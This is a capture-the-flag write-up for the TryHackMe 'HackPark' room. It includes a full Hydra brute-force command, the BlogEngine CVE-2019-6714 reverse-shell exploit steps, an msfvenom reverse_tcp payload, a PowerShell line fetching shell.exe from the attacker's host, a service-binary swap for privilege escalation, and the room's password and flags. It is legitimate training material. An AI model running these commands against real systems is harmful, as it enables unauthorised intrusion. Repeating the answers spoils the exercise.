# TryHackMe - HackPark

Bruteforce a websites login with Hydra, identify and use a public exploit then escalate your privileges on this Windows machine!

## Task 1  Deploy the vulnerable Windows machine

###  - Whats the name of the clown displayed on the homepage?

`pennywise`

## Task 2  Using Hydra to brute-force a login

###  - We need to find a login page to attack and identify what type of request the form is making to the webserver. Typically, web servers make two types of requests, a GET request which is used to request data from a webserver and a POST request which is used to send data to a server.You can check what request a form is making by right clicking on the login form, inspecting the element and then reading the value in the method field. You can also identify this if you are intercepting the traffic through BurpSuite (other HTTP methods can be found here).What request type is the Windows website login form using?

`POST`

###  - Now we know the request type and have a URL for the login form, we can get started brute-forcing an account.Run the following command but fill in the blanks:hydra -l <username> -P /usr/share/wordlists/<wordlist> <ip> http-post-formGuess a username, choose a password wordlist and gain credentials to a user account!

`hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.37.242 http-post-form "/Account/login.aspx?ReturnURL=/admin:__VIEWSTATE=6Qpl4BNzq%2BQIvMubXh2uopSvRuv5f12M89N1oiVCc27f54nZFehpq2sAbHyFD6HeceZZoPrO%2FUyWS6gH4I1y37xPDIrvBpkPGUqCkdXeQyN1mFfARRJNSBefCQakXH37QLA%2Flw%2BwtdsSAIY4ub%2F3TtH1%2Br4f2e24OmNcYeh3GqY48cYO&__EVENTVALIDATION=s9DMm%2BDemAoNXEUmyBtfllDxFzYZxgg2kyUFwx43%2FynqcUEtlJGdH3F12Yn4tnXhi%2BUtg0SyylksDrrAiBvH3zk6r5DcuV8ucrUIckzbFyxkaAXbgSUSAKOvDLf8oVt%2BRsFrpBXQujWWgbmPlz2sUCQaF9yGTjheWquQEqJXVl07CA0p&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed"`

`1qaz2wsx`

## Task 3  Compromise the machine

###  - Now you have logged into the website, are you able to identify the version of the BlogEngine?

`3.3.6.0`

###  - Use the exploit database archive to find an exploit to gain a reverse shell on this system. What is the CVE?

`https://www.exploit-db.com/exploits/46353`

`CVE-2019-6714`

###  - Using the public exploit, gain initial access to the server.Who is the webserver running as?

`After downloading the exploit, I renamed the file to "PostView.ascx" and uploaded it. I then started a netcat listener and navigated to  http://10.10.10.10/?theme=../../App_Data/files on the blogengine website to run my "PostView.ascx" file.`

`iis apppool\blog`

## Task 4  Windows Privilege Escalation

`Created a payload for rev shell in msfvenom, started a python http.server, used a powershell script to pull the metasploit payload onto the machine. The reasons for this was to have a stable shell and allow for more functionality.`

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.6.80.72 LPORT=9001 -f exe > shell.exe`

`python3 -m http.server`

`powershell -c "Invoke-WebRequest -Uri 'http://10.6.80.72:8000/shell.exe' -OutFile 'C:\Windows\Temp\shell.exe'"`

`Execute the shell.exe by navigating the netcat shell and running ./shell.exe`

###  - You can run metasploit commands such as sysinfo to get detailed information about the Windows system. Then feed this information into the windows-exploit-suggester script and quickly identify any obvious vulnerabilities.What is the OS version of this windows machine?

`Windows 2012 R2 (6.3 Build 9600)`

###  - Further enumerate the machine.What is the name of the abnormal service running?

`ps`

`WindowsScheduler`

###  - What is the name of the binary you're supposed to exploit?

`Found in the logs that every 30 seconds it would execute message.exe as root`

`Message.exe`

###  - Using this abnormal service, escalate your privileges!What is the user flag (on Jeffs Desktop)?

`Changed the name of our shell.exe to Message.exe to gain root priv because windows schedulers has service access.`

`759bd8af507517bcfaede78a21a73e39`

###  - What is the root flag?

`7e13d97f05f7ceb9881a3eb3d78d3e72`

## Task 5  Privilege Escalation Without Metasploit

###  - Now you know how to pull files from your machine to the victims machine, we can pull winPEAS.bat to the system using the same method! (You can find winPEAS here)WinPeas is a great tool which will enumerate the system and attempt to recommend potential vulnerabilities that we can exploit. The part we are most interested in for this room is the running processes!Tip: You can execute these files by using .\filename.exeUsing winPeas, what was the Original Install time? (This is date and time)

`Use the upload feature in metasploit to upload winPEAS.exe.`

`8/3/2019, 10:43:23 AM`
